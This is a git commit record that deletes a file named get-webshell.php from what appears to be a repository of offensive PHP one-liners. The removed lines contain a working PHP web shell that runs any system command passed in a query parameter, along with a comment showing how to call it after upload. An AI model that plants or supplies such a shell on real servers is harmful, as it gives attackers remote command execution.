10a25df825ca246b584ae3754b7371dad3126b31
Zayd <114421293+partyh4t@users.noreply.github.com>
2024-01-05 21:04:22 -0500

    Delete Scripts/PHP One Liners/get-webshell.php

--- Scripts/PHP One Liners/get-webshell.php
+++
@@ -1,6 +0,0 @@
-// pass an arbitrary system command via a query parameter
-
-<?php echo system($_GET['command']); ?>
-
-// Once uploaded, use this to pass commands: GET /example/get-webshell.php?command=whoami HTTP/1.1
-
